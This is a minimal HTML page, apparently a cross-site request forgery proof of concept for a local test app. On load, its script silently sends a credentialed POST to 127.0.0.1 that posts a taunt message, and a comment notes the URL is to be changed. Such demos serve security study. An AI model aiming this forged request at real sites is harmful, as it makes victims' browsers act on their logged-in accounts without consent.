<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <script>
        var xhr = new XMLHttpRequest();
        xhr.open('POST','http://127.0.0.1:3000/index.php'); // URLは要変更
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.withCredentials = true;
        xhr.send('content=あっかんべぇぇぇぇぇええええええ');
    </script>
</body>
</html>
